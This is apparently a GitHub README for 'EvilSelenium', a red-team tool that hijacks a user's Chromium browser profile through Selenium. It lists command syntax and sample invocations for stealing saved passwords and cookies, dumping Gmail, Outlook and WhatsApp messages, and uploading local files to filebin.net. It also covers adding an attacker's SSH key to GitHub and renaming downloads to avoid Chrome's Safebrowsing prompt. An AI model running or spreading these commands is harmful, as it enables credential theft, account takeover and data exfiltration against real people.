# EvilSelenium
EvilSelenium is a new project that weaponizes <a href="https://www.selenium.dev/">Selenium</a> to abuse Chromium-based browsers. The current features right now are:

* Steal stored credentials (via autofill)
* Steal cookies
* Take screenshots of websites
* Dump Gmail/O365 emails
* Dump WhatsApp messages
* Download & exfiltrate files
* Add SSH keys to GitHub

Or extend the existing functionality to suit your needs (e.g. Download files from the user's GDrive/OneDrive).

# Note

1. When this tool is run it will terminate any existing browser processes in order to be able to run with the user's browser profile which contains the passwords & active sessions.

2. I built this tool in about a week & I didn't run as many tests as I should therefore there may be some bugs.

3. Selenium modules are not always stable. Due to the constant changes in websites some modules may occasionally break. I'll try my best to maintain the existing modules to ensure they work as intended but you've been warned.

# Usage
	
	EvilSelenium.exe /?

    /help - Show this help menu.

    SETUP:
    /install - Install chromedriver & Selenium webdriver. Run this once.

    GLOBAL: (accepted with every command)
    /browserdir [appdata_local_routing] - Use custom browser, Input should be the routing inside %appdatalocal% dir (e.g. "Microsoft\Edge")

    RECON:
    /enumsavedsites [out_path] - Check which websites have passwords saved via screenshot(s).
    /screenshot [website] [out_path] - Screenshot a given webpage.

    CREDENTIALS:
    /autorun - Extract saved credentials from common websites.
    /dynamicid [login_page] [username_id] [password_id] - Extract saved credentials from a website, providing the username field ID & password field ID.
    /dynamicname [login_page] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value & password name value.
    /dynamicname2 [login_page] [username_position] [password_position] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value, password name value and their positions.

    COOKIES:
    /cookies [website] - Grabs cookies for a given website.

    MODULES:
    /download [file_url] [seconds] - Downloads a file and specify time to wait for download to finish. File extensions should not be executable.
    /exfil [local_file] [seconds] - Uploads a file on filebin.net and outputs the download link.
    /gmail [out_path] [num_of_emails] - Fetches emails from mail.google.com if user is authenticated. Max 50 emails.
    /outlook [out_path] [num_of_emails] - Fetches emails from Outlook if user is authenticated.
    /o365 [out_path] [num_of_emails] - Fetches emails from O365 Outlook if user is authenticated.
    /github [key] - Add your SSH key to Github if user is authenticated.
    /whatsapp [out_path] - Fetches Whatsapp messages if user is authenticated (BETA).

# Setup

The `/install` command will download the Chrome Driver and Selenium WebDriver which are the necessary requirements. EvilSelenium will work on Chrome versions 100-90.

**Tested on Windows 10, Chrome v97 & v90.**

	EvilSelenium.exe /install

# Global configuration
By default EvilSelenium will try to use Google Chrome's User Data folder to retrieve data, but other [Chromium](https://en.wikipedia.org/wiki/Chromium_(web_browser)) based browsers are supported as well.<br>
In order to use different Chrome based browsers you should add the `/browserdir` following the browser routing in the `%localappdata%` directory.
Here are examples for a few common browsers (should be added to any CLI command):
1. **Brave** - `/browserdir BraveSoftware\Brave-Browser`
2. **Microsoft Edge** - `/browserdir Microsoft\Edge`
3. **Vivaldi** - `/browserdir Vivaldi`

# Recon Module

`/enumsavedsites` - This will take screenshots of chrome://settings/passwords

`/screenshot` - Screenshot any website. If the user is authenticated to the website then you get authenticated screenshots :).

# Credentials Module

**IMPORTANT:** The credentials module will **DELETE COOKIES** in order to steal credentials from autofill. Ideally, you should use the credentials module at the end if you want to export cookies.

`/autorun` - Prebuilt templates for common websites. I'll continue to add more.

`/dynamicid` - Provide the login URL along with the username input field's ID and password field's ID. This is equivalent to document.getElementById().

`/dynamicname` - If the fields don't have IDs, provide the fields' name values. It will pick the first index of the name values. This is equivalent to document.getElementsByName()[0].value.

`/dynamicname2` - Provide the fields' name values along with their index position. This is equivalent to document.getElementsByName()[x].value where x is the provided position.

# Cookies Module

`/cookies` - Dumps cookies from the specified website.

# Misc Modules

These are additional modules I built to demonstrate what sort of actions you can do with Selenium.

`/download` - Download a file & specify time to wait for the download. A non-executable file extension should be appended to the file before downloading to avoid Chrome's Safebrowsing prompt.

`/exfil` - Uploads a file on filebin.net & specify the time to wait for the upload to complete. Once the upload is completed the file's download link is written.

`/gmail` - Fetches emails from mail.google.com if user is authenticated. Max 50 emails.

`/outlook` - Fetches emails from Outlook if user is authenticated.

`/o365` - Fetches emails from O365 Outlook if user is authenticated.

`/github` - Add your SSH key to Github if user is authenticated.

`/whatsapp` - Fetches Whatsapp messages if user is authenticated (BETA).

# Sample Commands
	
	EvilSelenium.exe /screenshot https://mail.google.com c:\users\mr.d0x\downloads
	
	EvilSelenium.exe /dynamicid https://www.hybrid-analysis.com/login login_email login_password
	
	EvilSelenium.exe /dynamicname https://linkedin.com session_key session_password

# Demo

![Example](https://github.com/mrd0x/EvilSelenium/blob/main/demo-1.png)

# Support

* Follow me on twitter <a href="https://twitter.com/mrd0x">@mrd0x</a>
* BTC Wallet: 38ApE9ciNHiXzEaQExLXdwM6TrEpz2wCUi (for coffee obviously)
